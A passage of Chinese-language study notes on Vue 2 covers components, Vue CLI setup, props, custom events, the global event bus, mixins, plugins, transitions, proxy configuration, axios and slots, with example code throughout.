            <h2>{{msg}}</h2>
        `,
        data() {
            return {
                msg: 'welcome'
            }
        },
    })

    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>
                <h2>学校地址：{{address}}</h2>
                <student></student>
            </div>
        `,
        data() {
            return {
                name: 'xxx大学',
                address: '武汉'
            }
        },
        components: {
            student
        }
    })

    // 定义app组件
    const app = Vue.extend({
        template: `
            <div>
                <hello></hello>
                <school></school>
            </div>
        `,
        components: {
            hello,
            school
        }
    })

    const vm = new Vue({
        template: `<app></app>`,
        el: '#root',
        //注册组件（局部）
        components: {
            app
        }
    })
</script>
```

> vm -> app -> 各级子组件

##### VueComponent

```html
<body>
    <!-- 1、一个重要的内置关系：VueComponent.prototype.__proto__===Vue.prototype
    2、为什么要有这个关系：让组件实例对象（vc）可以访问到Vue原型上的属性、方法
    关于VueComponent：
        1.school组件本质是一名为VueCompontent的构造函数，且不是程序员定义的，是Vue.extend生成的
        2.我们只需要写<school/>或<school></school>Vue解析时会帮我们创建school组件的实例对象即Vue帮我们执行的：new VueComponent(options)
        3.特别注意：每次调用Vue.extend返回的都是一个全新的VueComponent！！！
        4.关于this指向
            （1）组件配置中：
                data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】
            （2）new Vue()配置中：
                data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】 -->
    <div id="root">
        <school></school>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    // 定义组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>
                <h2>学校地址：{{address}}</h2>
            </div>
        `,
        data() {
            return {
                name: 'xxx大学',
                address: '武汉'
            }
        }
    })
    new Vue({
        el: '#root',
        components: {
            school
        }
    })
</script>
```

> 每一个组件实例就是一个构造函数

##### 一个重要的内置关系

```
/* VueComponent.prototype.__proto__ === Vue.prototype */
```

![Vue、VueComponent原型链间的关系](https://raw.githubusercontent.com/ZhangjunqiGithub/picture/master/prototype.jpg)

> 上图黄色线的作用：让VueComponent的实例也可访问到Vue的原型对象

#### 单文件组件（常用）

> vscode默认情况下是不认识.vue文件的，如果要想在vscode中编写.vue文件就需要安装一个	Vetur	插件。
>
> 安装完插件后再vscode中输入	<v	就可以生成一个.vue文件中对应的三个标签<template></template>、<script></script>、<style></style>

##### 基本使用（以下文件在浏览器中无法显示，在Vue脚手架中就可以正常显示了）

**School.vue**

```vue
<template>
    <!-- 组件的结构 -->
    <div class="demo">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="showName">提示学校名</button>
    </div>
</template>

<script>
// 组件交互相关的代码（数据、方法等等）
    export default {//默认暴露（当只需要暴露一个对象的时候一般采用默认暴露）（对应导入方式：import School from './School'）
        name:'School',
        data() {
            return {
                name: 'xxx大学',
                address: '武汉'
            }
        },
        methods: {
            showName() {
                alert(this.name);
            }
        },
    }
    
</script>

<style>
/* 组件的样式 */
    .demo {
        background-color: pink;
    }
</style>
```

**Student.vue**

```vue
<template>
    <!-- 组件的结构 -->
    <div>
        <h2>学生姓名：{{name}}</h2>
        <h2>学生年龄：{{age}}</h2>
    </div>
</template>

<script>
// 组件交互相关的代码（数据、方法等等）
    export default {
        name:'Student',
        data() {
            return {
                name: 'xxx大学',
                age: 18
            }
        },
    }
</script>
```

**App.vue**

>作用：整合所有的子组件

```vue
<template>
    <div>
        <School></School>
        <Student></Student>
    </div>
</template>

<script>
    //先导入相应的组件
    import School from './School'
    import Student from './Student'
    //在此处注册对应的组件
    export default {//默认暴露
        name: 'App',
        components:{
            School,
            Student
        }
    }
</script>

<style>

</style>
```

**main.js**

> 管理App组件（vm）

```js
//先导入App组件
import App from './App.vue'
new Vue({
    el: '#root',
    template: `<App></App>`,//此处也可以不写，可以将此处的<App></App>写到index.html中
    //在此处注册App组件
    components: { App },
})
```

**index.html**

>模板容器

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <div id="root"></div>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="./main.js"></script>
</body>

</html>
```

### Vue2（Vue CLI）(Vue脚手架) (Vue command line interface)

官方网站：https://cli.vuejs.org/zh/

> 脚手架的版本号要高于Vue的的版本

**使用步骤：**

1、（仅第一次执行）：全局安装 @vue/cli

切换镜像源加快下载安装速度：

```bash
npm config set registry https://registry.npmmirror.com
```

全局安装命令：

```bash
npm install -g @vue/cli
```

> 注意：如果该命令执行过一次后，以后就不需要再执行了。

2、**切换到你要创建项目的目录**，然后使用如下命令创建项目

```bash
vue create xxx
```

> 当执行完这一条命令的时候，控制台会出现如下信息
>
> Please pick a preset:(Use arrow keys)
>
> Default ([Vue 2] babel. eslint)
>
> Default (Vue 3) ([Vue 3] babel. eslint)
>
> Manually select features
>
> 此处是要求你选择一个Vue的版本，也就是说是Vue 2的项目还是Vue 3的项目。
>
> 其中babel的作用：ES6 ===> ES5
>
> 其中eslint的作用：语法检查

3、启动项目

```bash
npm run serve
```

#### 脚手架中文件的分析

**.gitignore**：git忽略文件

**babel.config.js**：babel的配置ES6 ===> ES5

**package-lock.json**：包版本控制文件，配置了各个包的所有的相关信息

**package.json**：只存储了各个包的名称和版本号

**README.md**：项目说明

##### src文件夹

###### main.js

当我们执行了npm run serve后首先执行的就是这个main.js文件

```js
//引入整个项目的入口文件
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false;
//创建Vue的实例
new Vue({
    render: h => h(App)/**/
}).$mount('#app')
/*  或  new Vue({
    el: '#app',
    render: h => h(App)
})*/
```

> import Vue from 'vue'的执行流程：
>
>找到node_modules/vue/package.json，找到其中的module属性，module属性对应的值就是这条语句所引入的vue文件
>
>关于不同版本的Vue：
>
> 1、vue.js与vue.runtime.xxx.js的区别：
>
>（1）vue.js是完整版的Vue，包括：核心功能+模板解析器
>
>（2）vue.runtime.xxx.js是运行版的Vue，只包含：核心功能：没有模板解析器
>
>2、因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的create Element函数去指定具体内容

###### assets文件夹

一般存放静态资源例如图片、视频

###### components文件夹

存放各个子组件（除了App.vue）

###### App.vue

管理各个子组件,导入并注册所有的子组件

##### public文件夹

###### index.hmtl

整个页面的界面

```html
<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标 -->
    <!-- <%= BASE_URL %> 可以找到public文件夹 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
    <!-- 配置网页标题 -->
    <title>
        <!-- %= htmlWebpackPlugin.options.title %
			这句话的作用就是找到package.json中的name属性的值作为网站的标题 -->
        Welcome
    </title>
</head>

<body>
    <!-- 当浏览器不支持js时noscript中的元素就会渲染到页面上 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
</body>

</html>
```

###### css文件夹

存放一些css文件

#### 修改vue的默认配置

> 在**package.json**同级目录下新建一个**vue.config.js**详细配置信息如下：

```js
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
    transpileDependencies: true,
    pages: {
        index: {
            // page 的入口
            entry: 'src/main.js',
            // 模板来源
            template: 'public/index.html',
            // 在 dist/index.html 的输出
            filename: 'index.html',
            // 当使用 title 选项时，
            // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
            title: 'Index Page',
            // 在这个页面中包含的块，默认情况下会包含
            // 提取出来的通用 chunk 和 vendor chunk。
            chunks: ['chunk-vendors', 'chunk-common', 'index']
        },
    },
    lintOnSave: false, //关闭语法检查
    // 开启代理服务器（解决跨域问题）
    // devServer: {
    //     proxy: 'http://localhost:5000'
    // }

    // 代理服务器二：
    devServer: {
        proxy: {
            '/zjq': {
                target: 'http://localhost:5000',
                pathRewrite: { '^/zjq': '' }, //只有在端口号后面加上/zjq才能走代理服务器，此处是将请求地址中的/zjq用''替换掉，保证请求地址的正确性
                ws: true, //用于支持websocket(Vue中默认为true)
                changeOrigin: true //用于控制请求头中的host值，为true时，服务器收到的请求头中的host为：localhost:5000,反之，则为：localhost:8080(Vue中默认为true)
            }, //配置多个代理
            // '/demo': {
            //     target: 'http://localhost:5001',
            //     pathRewrite: {'^/demo': ''},
            //     ws: true,//用于支持websocket
            //     changeOrigin: true//用于控制请求头中的host值
            // }
        }
    }
})
```

#### ref属性的使用

```vue
<template>
    <div>
        <h1 v-text="msg" ref="title"></h1>
        <button ref="btn" @click="showDom">点击输出上方的DOM元素</button>
        <school ref="sch"/>
    </div>
</template>

<script>
//导入已经写好的School组件
import School from './components/School.vue'
export default {
    name: 'App',
    components:{School},
    data() {
        return {
            msg: 'hello,welcome'
        }
    },
    methods: {
        showDom(){
            console.log(this.$refs.title);//输出真实DOM元素
            console.log(this.$refs.btn);//输出真实DOM元素
            console.log(this.$refs.sch);//School组件的实例对象（vc）
        }
    }
}
</script>
```

#### props属性的使用和自定义事件

> 实现组件间的数据传递

```vue
<template>
    <div>
        <h1>{{msg}}</h1>
        <h2>学生名称：{{name}}</h2>
        <h2>学生性别：{{sex}}</h2>
        <h2>学生年龄：{{age + 1}}</h2>
    </div>
</template>

<script>
export default {
    name:'Student',
    data() {
        return {
            msg: 'welcome',
            //props中的数据比data中的数据的优先级高，要想能够修改外部传入的数据则需要用以下代码过度
            myAge:this.age
        }
    },//外部传入的数据（注意这些数据不能修改）
    props:['name','age','sex']//简单声明接收（常用）

    //接收的同时对数据进行类型限制
    /*props:{
        name:String,
        age:Number,
        sex:String
    }*/

//接受的同时对数据：进行类型限制+默认值的指定+必要性的限制（少用）
    /*props:{
        name:{
            type:String,//name的类型是字符串
            required:true//name是必要的
        },
        age:{
            type:Number,
            default:99//默认值
        },
        sex:{
            type:String,
            required:true
        }
    }*/
}
</script>
```

**使用组件时：**

```vue
<!-- 在使用组件时传入数据 -->
<Student name="李四" sex="女" :age="18"/>
```

**上面的方法都是父组件向子组件传递参数**

**子组件向父组件传递参数：**

通过父组件给子组件传递函数类型的props实现；

父组件代码(App.vue)：

```vue
<template>
    <div class="app">
        <h1>{{msg}}</h1>
        <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
        <School :getSchoolName="getSchoolName"/>
        <hr>
        <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递参数 （第一种写法，使用@或v-on）-->
        <Student v-on:getStudentName.once="getStudentName"/>
        <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递参数 （第二种写法，使用ref）-->
        <Student ref="student"/>
        <!-- 如果要想给自定义组件绑定（原生）事件则需要在后面加上.native否则Vue就将其当作自定义事件处理
        <Student ref="student" @click.native="show"/> -->
    </div>
</template>

<script>
import School from './components/School.vue';
import Student from './components/Student.vue';
export default {
    name: 'App',
    components:{School, Student},
    data() {
        return {
            msg: 'hello'
        }
    },
    methods: {
        getSchoolName(name) {
            console.log('App收到了学校名：',name);
        },
        //...params的意思是当传入的参数过多时，第一个参数用name来接收，剩下的参数通过params来接收并自动生成一个数组
        getStudentName(name,...params){
            console.log('App收到了学生名：',name,params);
        }
    },
    mounted() {
        //意思是程序运行后等待3s在给Student组件绑定一个getStudentName事件，所以在重程序运行后3s内通过Student组件触发getStudentName事件是不可以的
        setTimeout(() => {
            // 先给Student组件绑定一个getStudentName事件，然后当触发getStudentName时调用getStudentName函数
        this.$refs.student.$on('getStudentName',this.getStudentName)
        // 将上面的on改为once可以控制给事件只能触发一次
        // this.$refs.student.$once('getStudentName',this.getStudentName)
        }, 3000);
    },
}
</script>

<style scoped>
    .app {
        background-color: grey;
        padding: 5px;
    }
</style>
```

子组件代码(School.vue)：

```vue
<template>
    <div class="school">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="sendSchoolName">把学校名给App</button>
    </div>
</template>

<script>
    export default {
        name:'School',
        props:['getSchoolName'],
        data() {
            return {
                name:'xxx大学',
                address:'武汉'
            }
        },
        methods: {
            sendSchoolName() {
                this.getSchoolName(this.name)
            }
        },
    }
</script>

<style scoped>
    .school{
        background-color: skyblue;
        padding: 5px;
    }
</style>
```

student.vue

```vue
<template>
    <div class="student">
        <h2>学生名称：{{name}}</h2>
        <h2>学生性别：{{sex}}</h2>
        <h2>当前求和为：{{number}}</h2>
        <button @click="add">number++</button>
        <button @click="sendStudentName">把学生名给App</button>
        <button @click="unbind">解绑getStudentName事件</button>
        <button @click="death">销毁当前Student组件的实例(vc)</button>
    </div>
</template>

<script>
    export default {
        name:'Student',
        data() {
            return {
                name:'张三',
                sex:'男',
                number: 0
            }
        },
        methods: {
            sendStudentName() {
                // 触发Student组件实例身上的getStudentName事件
                this.$emit('getStudentName',this.name,1,2,3)
            },
            unbind() {
                this.$off('getStudentName')//只能解绑一个自定义事件
                // this.$off(['getStudentName'],['第二个自定义事件'])解绑多个自定义事件
                //this.$off()解绑该组件身上绑定的所有的自定义事件
            },
            death() {
                this.$destroy()//销毁了当前的Student组件的实例,销毁后所有的Student实例的自定义事件全部都不可用了，（低版本的Vue中先版本原生也不可用了）原生就有的事件还可以用，但是由于组件实例被删除，页面上对应的内容也不会再更改了
            },
            add() {
                console.log('add被调用了');
                this.number++;
            }
        },
    }
</script>

<style lang="less" scoped>
    .student{
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    }
</style>
```

#### mixin混入

> 当多个组件使用某些重复的函数，数据等的时候可以将这些重复的部分分离出来，写到一个xxx.js文件中，注意要将此文件暴露出去，使用的时候需要先引入，然后再配置mixins:[xxx]属性，此时（如本例子）就可以使用showName()方法了。

```js
export const mixin = {
    methods: {
        showName() {
            alert(this.name);
        }
    }
}
```

```vue
<template>
    <div>
        <h2 @click="showName">学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    import {mixin} from '../mixin'
    export default {
        name:'School',
        data() {
            return {
                name:'xxx大学',
                address:'武汉'
            }
        },
        mixins:[mixin]
    }
</script>
```

> 全局混入： Vue.mixin(xxx)
>
> 如果要混合的数据原组件就存在，则以原组件的为准；注意当混合生命周期钩子的时候原来的和将混合的钩子都使用。

#### plugins插件的使用

> 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用这传递的数据。
>
> 1、新建一个plugins.js在其中写入install(Vue,prop1,prop2...) {}
>
> 2、插件的使用：在main.js中先引入插件，然后通过Vue.use(xxx)应用插件

**plugins.js**

```js
export default {
    // install也可带参数
    install(Vue) {
        // 全局过滤器
        Vue.filter('mySlice', function(value) {
            return value.slice(0, 4);
        })

        // 定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value;
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus();
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value;
            }
        })

        // 定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            }
        })

        // 给Vue原型上添加一个方法
        Vue.prototype.hello = () => {
            alert('你好！');
        }
        /*
        Vue.prototype.$myMethod = function() {...}
        Vue.prototype.$myProperty = xxx
        */
    }
}
```

main.js

> 在main.js中引入并应用插件

```js
import Vue from 'vue'
import App from './App.vue'
// 引入插件
import plugins from './plugins'
Vue.config.productionTip = false;

// 应用插件
Vue.use(plugins)
new Vue({
    el: '#app',
    render: h => h(App)
})
```

#### scoped的使用

> 作用：让样式在局部生效，防止冲突。加了scoped属性后，此处的css只用于该组件中的结构。（如果不写scoped，当各组件中style标签中如果写了相同的类名或id名时就会出现冲突，因为整合时会把所有组件中所写的css样式整合到一起）
>
> 写法：`<style scoped>`
>
> 查看webpack的所有版本：`npm view webpack versions`
>
> 查看less-loader的所有版本：`npm  view less-loader`
>
> 注意：如果要使用less就需要安装less-loader，如果安装了默认的最新版本，可能会出现报错，原因是所使用的webpack的版本和less-loader的版本不兼容，所以要安装指定版本的less-loader。
>
> `npm install less-loader`@指定版本

```vue
<style lang="css" scoped>/*(不写lang属性默认也是css)*/
    xxx
    xxx
</style>
<!-- <style lang="less" scoped>
    xxx
    xxx
</style> -->
```

实现方法：

在结构中添加一个属性：例：`<div data-v-3375b0b8 clss="abc">...</div>`

样式中用属性选择器：例：.abc[data-v-3375b0b8] {	background-color: skyblue;	}

#### 组件自定义事件的绑定与解绑

> 在beforeDestory生命周期钩子中，所有的自定义事件都会不解绑，但是原有的事件并没有被解绑。

> 子组件要是想给父组件传递数据，可以采用三种方式
>
> 1、在父组件中写一个方法并要求传入参数，然后将这个方法以参数的形式传入到子组件中，在子组件中通过props来声明接收，然后在子组件中想办法去调用父组件中传过来的方法并将想要传递的参数传入，在父组件中就可以收到子组件传递过来的数据了。
>
> 2、在父组件中写一个方法并要求传入参数，然后将这个方法通过事件绑定的方法绑定到子组件身上，此时子组件中就可以通过this.$emit('function',params)来调用自己身上绑定的那个function方法，并将数据传递到父组件中；在子组件中也可以通过this.$off('function')来解绑function方法，但是这种方法有一个弊端：一次只能解绑一个自定义事件；我们可以通过this.$off(['function1'],['function2']...)来解绑多个自定义事件；如果我们一次解绑所有的自定义事件，可以调用this.$off();这样就可以解绑该组件身上所绑定的所有的自定义事件了。
>
> 注意：如果销毁了当前的子组件的实例,销毁后所有的该子组件实例的自定义事件全部都不可用了，（低版本的Vue中先版本原生也不可用了）原生就有的事件还可以用，但是由于组件实例被删除，页面上对应的内容也不会再更改了
>
> 3、全局事件总线

子组件School.vue

```vue
<template>
    <div class="school">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="sendSchoolName">把学校名给App</button>
    </div>
</template>

<script>
    export default {
        name:'School',
        props:['getSchoolName'],
        data() {
            return {
                name:'xxx大学',
                address:'武汉'
            }
        },
        methods: {
            sendSchoolName() {
                this.getSchoolName(this.name)
            }
        },
    }
</script>

<style scoped>
    .school{
        background-color: skyblue;
        padding: 5px;
    }
</style>
```

子组件Student.vue

```vue
<template>
    <div class="student">
        <h2>学生名称：{{name}}</h2>
        <h2>学生性别：{{sex}}</h2>
        <h2>当前求和为：{{number}}</h2>
        <button @click="add">number++</button>
        <button @click="sendStudentName">把学生名给App</button>
        <button @click="unbind">解绑getStudentName事件</button>
        <button @click="death">销毁当前Student组件的实例(vc)</button>
    </div>
</template>

<script>
    export default {
        name:'Student',
        data() {
            return {
                name:'张三',
                sex:'男',
                number: 0
            }
        },
        methods: {
            sendStudentName() {
                // 触发Student组件实例身上的getStudentName事件
                this.$emit('getStudentName',this.name,1,2,3)
            },
            unbind() {
                this.$off('getStudentName')//只能解绑一个自定义事件
                // this.$off(['getStudentName'],['第二个自定义事件'])解绑多个自定义事件
                //this.$off()解绑该组件身上绑定的所有的自定义事件
            },
            death() {
                this.$destroy()//销毁了当前的Student组件的实例,销毁后所有的Student实例的自定义事件全部都不可用了，（低版本的Vue中先版本原生也不可用了）原生就有的事件还可以用，但是由于组件实例被删除，页面上对应的内容也不会再更改了
            },
            add() {
                console.log('add被调用了');
                this.number++;
            }
        },
    }
</script>

<style lang="less" scoped>
    .student{
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    }
</style>
```

父组件App.vue

```vue
<template>
    <div class="app">
        <h1>{{msg}}</h1>
        <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
        <School :getSchoolName="getSchoolName"/>
        <hr>
        <Student v-on:getStudentName="getStudentName"/>
        <Student ref="student"/>
        <!-- 如果要想给自定义组件绑定（原生）事件则需要在后面加上.native否则Vue就将其当作自定义事件处理
        <Student ref="student" @click.native="show"/> -->
    </div>
</template>

<script>
import School from './components/School.vue';
import Student from './components/Student.vue';
export default {
    name: 'App',
    components:{School, Student},
    data() {
        return {
            msg: 'hello'
        }
    },
    methods: {
        getSchoolName(name) {
            console.log('App收到了学校名：',name);
        },
        //...params的意思是当传入的参数过多时，第一个参数用name来接收，剩下的参数通过params来接收并自动生成一个数组
        getStudentName(name,...params){
            console.log('App收到了学生名：',name,params);
        }
    },
    mounted() {
        //意思是程序运行后等待3s在给Student组件绑定一个getStudentName事件，所以在重程序运行后3s内通过Student组件触发getStudentName事件是不可以的
        setTimeout(() => {
            // 先给Student组件绑定一个getStudentName事件，然后当触发getStudentName时调用getStudentName函数
        this.$refs.student.$on('getStudentName',this.getStudentName)
        // 将上面的on改为once可以控制给事件只能触发一次
        // this.$refs.student.$once('getStudentName',this.getStudentName)
        }, 3000);
    },
}
</script>

<style scoped>
    .app {
        background-color: grey;
        padding: 5px;
    }
</style>
```

#### 全局事件总线（用于组件间的数据传递）

**优点：可以简化组件间数据传递的过程，尤其是需要跨过多个组件来传递数据的情况。**

**使用步骤：**

>先在App.vue中安装全局事件总线，在Vue原型对象上添加一个$bus对象，然后将其指向组件实例对象VueModel,即在App.vue中与render同级，添加一个生命周期钩子beforeCreate在其中写上`Vue.Prototype.$bus = this`即可。
>
>在子组件中子需要通过`this.$bus.$on('function',(data) => {})`来往全局事件总线上添加方法即可，其它的组件如果想要给该组件传递数据，只需要通过`this.$bus.$emit('function',params)`，即可把数据params传递给该组件并保存到data身上。

**子组件School.vue**

```vue
<template>
    <div class="school">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</template>

<script>
    export default {
        name:'School',
        data() {
            return {
                name:'xxx大学',
                address:'武汉'
            }
        },
        mounted() {
            this.$bus.$on('hello',(data) => {
                console.log('我是School组件，收到了数据',data);
            })
        },
        //用完该全局事件后就需要解绑该事件
        beforeDestroy() {
            this.$bus.$off('hello')
        },
    }
</script>

<style scoped>
    .school{
        background-color: skyblue;
        padding: 5px;
    }
</style>
```

**子组件Student.vue**

```vue
<template>
    <div class="student">
        <h2>学生名称：{{name}}</h2>
        <h2>学生性别：{{sex}}</h2>
        <button @click="sendStudentName">把学生名给School组件</button>
    </div>
</template>

<script>
    export default {
        name:'Student',
        data() {
            return {
                name:'张三',
                sex:'男',
            }
        },
        methods:{
            sendStudentName() {
                this.$bus.$emit('hello',this.name)
            }
        },
    }
</script>

<style lang="less" scoped>
    .student{
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    }
</style>
```

**父组件App.vue**

```vue
<template>
    <div class="app">
        <h1>{{msg}}</h1>
        <School/>
        <Student/>
    </div>
</template>

<script>
import School from './components/School.vue';
import Student from './components/Student.vue';
export default {
    name: 'App',
    components:{School, Student},
    data() {
        return {
            msg: 'hello'
        }
    },
}
</script>

<style scoped>
    .app {
        background-color: grey;
        padding: 5px;
    }
</style>
```

#### 消息订阅与发布

> 作用：一种组件间通信的方式，适用于任意组件间通信

**使用步骤：**

1、安装pubsub-js： `npm i pubsub-js`

2、引入：`import pubsub-js from 'pubsub-js'`

3、接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。

```vue
methods() {
	demo(data) {...}
}
......
mounted() {
	this.pid = pubsub.subscribe('xxx', this.demo)//订阅消息
}
```

4、提供数据：`pubsub.publish('xxx',数据)`

5、在beforeDestroy生命周期钩子中，用`pubsub.unsubscribe(this.pubId)`去取消订阅

> 注意：在使用`pubsub.publish('xxx', params)`传递参数的时候，不能传递多个参数，如果需要传递多个参数则需要将多个数据打包成一个对象或者是数据才可以传递。

#### nanoid的使用

**简介：**NanoID 是一个**创建唯一 key 的轻量级的脚本库**，在过去有类似需求首先想到的是 uuid ，与其相比 NanoID 要小得多。 如果你的项目有生成唯一 key 或者使用 uuid 的场合，那么从现在开始，请使用 NanoID。

**使用方法：** 首先安装nanoid脚本库：`npm install nanoid`

​					然后在文件中引用：`import {nanoid} from 'nanoid'`

​					使用时只需要调用nanoid()即可生成一个唯一的id：`const testObj = {id:nanoid(), name:this.name}`

#### nextTick函数的使用

1、语法：this.$nextTick(回调函数)

2、作用：在下一次DOM更新结束后执行其指定的回调

3、什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行

**使用场景:** 

在同一个函数中如果需要在前面修改了数据后就立即先去重新解析模板然后再去继续执行后续代码，就需要用到this.$nextTick(function(){})函数了。

因为在同一个函数中只有当该函数中所有的代码都执行完毕后才会重新解析模板，如果已检测到修改了数据就去重新解析模板的话，会造成vue频繁的解析模板，出现效率底的问题。

那么当代码执行到该函数的时候，就会先去解析模板，然后再来执行该函数中的回调函数。

#### 动画与过度

| 类名           | 作用               |
| -------------- | ------------------ |
| v-enter-active | 进入时要播放的动画 |
| v-leave-active | 离开时要播放的动画 |
| v-enter        | 进入的起点         |
| v-enter-active | 进入时的动画       |
| v-enter-to     | 进入的终点         |
| v-leave        | 离开的起点         |
| v-leave-active | 离开时的动画       |
| v-leave-to     | 离开的终点         |

例子:

```vue
    /* 进入的起点、离开的终点 */
.hello-enter, .hello-leave-to{
  transform: translateX(-100%);
}

.hello-enter-active, .hello-leave-active{
  transition: 1s linear;
}

/* 进入的终点、离开的起点 */
.hello-enter-to, .hello-leave{
  transform: translateX(0);
}
```

**动画函数：**

```vue
@keyframes MyDisplay {
        from {
            transform: translateX(-100%);
        }
        to {
            transform: translateX(0px);
        }
    }
```

##### 基本使用：

```vue
<template>
  <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
      <transition appear>
          <h1 v-show="isShow">hello</h1>
      </transition>
  </div>
</template>

<script>
export default {
    name: "test1",
    data() {
        return {
            isShow: true,
        }
    },
}
</script>

<style scoped>
    h1 {
        background-color: pink;
    }
    .v-enter-active {
        animation: MyDisplay 1s linear;
    }
    .v-leave-active {
        animation: MyDisplay 1s linear reverse;
    }
    @keyframes MyDisplay {
        from {
            transform: translateX(-100%);
        }
        to {
            transform: translateX(0px);
        }
    }
</style>
```

```vue
<template>
  <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
      <transition-group name="hello" appear>
          <h1 v-show="!isShow" key="1">hello</h1>
          <h1 v-show="isShow" key="2">你好</h1>
      </transition-group>
  </div>
</template>

<script>
export default {
    name: "test2",
    data() {
        return {
            isShow: true,
        }
    },
}
</script>

<style scoped>
h1 {
    background-color: pink;
}
    /* 进入的起点、离开的终点 */
.hello-enter, .hello-leave-to{
  transform: translateX(-100%);
}

.hello-enter-active, .hello-leave-active{
  transition: 1s linear;
}

/* 进入的终点、离开的起点 */
.hello-enter-to, .hello-leave{
  transform: translateX(0);
}
</style>
```

> 注意：此处给transition-group或transition添加name属性也很重要，因为如果不添加name属性那么当需要添加的动画和过度的元素数量不止一个的时候大家都会去找v-enter-...等类，那么会导致所有元素的动画都一样。但是添加了name属性后对应的元素就会去找对应的name-enter-...等类

##### 第三方动画

使用第三方动画库时首先要安装对应的包：如：`npm i animate.css`

对应的网站地址：[Animate.css | A cross-browser library of CSS animations.](https://animate.style/)

#### 基本用法：

```vue
<transition-group
      appear
      name="animate__animated animate__bounce" 
      enter-active-class="animate__heartBeat" 
      leave-active-class="animate__hinge">
      <h1 v-show="isShow" key="1">hello</h1>
</transition-group>
```

#### 代理服务器的使用

在 **vue.config.js** 文件中的 **pages** 配置对象中添加一个 **devServer** 对象

```js
 // 开启代理服务器（解决跨域问题）
    // devServer: {
    //     proxy: 'http://localhost:5000'
    // }

    // 代理服务器二：
    devServer: {
        proxy: {
            '/zjq': {
                target: 'http://localhost:5000',
                pathRewrite: { '^/zjq': '' }, //只有在端口号后面加上/zjq才能走代理服务器，此处是将请求地址中的/zjq用''替换掉，保证请求地址的正确性
                ws: true, //用于支持websocket(Vue中默认为true)
                changeOrigin: true //用于控制请求头中的host值，为true时，服务器收到的请求头中的host为：localhost:5000,反之，则为：localhost:8080(Vue中默认为true)
            }, //配置多个代理
            // '/demo': {
            //     target: 'http://localhost:5001',
            //     pathRewrite: {'^/demo': ''},
            //     ws: true,//用于支持websocket
            //     changeOrigin: true//用于控制请求头中的host值
            // }
        }
    }
```

**axios的基本使用**

安装：`npm i axios`

基本使用：

使用前要先引用：`import axios from 'axios'`

```vue
axios.get('http://localhost:8080/zjq/api/students').then(
                res => {
                    console.log('请求成功了',res.data);
                },
                error => {
                    console.log('请求失败了',error.message);
                }
            )
```

> 注意：此处的访问地址 `http://localhost:8080/zjq/api/students` 和上方配置的代理服务器相对应

#### Vue-resource插件的使用

安装：`npm i vue-resource`

**在main.js中**

1、引入插件

`import vueResource from 'vue-resource'`

2、使用插件

`Vue.use(vueResource)`

> 此时VueComponent身上就会有一个$http

```vue
this.$http.get('http://localhost:8080/zjq/api/students').then(
                res => {
                    console.log('请求成功了',res.data);
                },
                error => {
                    console.log('请求失败了',error.message);
                }
            )
```

#### 插槽的基本使用

> 作用：等着使用者往插槽中填入结构

##### 默认插槽

**基本使用**

新建一个组件xxx.vue

```vue
<div>
      <h3>{{title}}分类</h3>
      <!-- 定义一个插槽，等着组件的使用者进行填充 -->
      <slot>我是一个默认值当使用者没有传递具体结构时，我会出</slot>
</div>
```

> 此处的title为父组件传递过来的数据

在使用该插槽的组件中先引入该组件 `import xxx from .../xxx.vue` 并注册该组件

```vue
<xxx title="内容">
    结构代码
</xxx>
<!-- 此处写的结构将展示在xxx.vue中的slot标签里面，如果不写结构代码，则将展示xxx.vue中的默认的内容 -->
```

##### 具名插槽

**借本使用**

新建一个组件xxx.vue

```vue
<div>
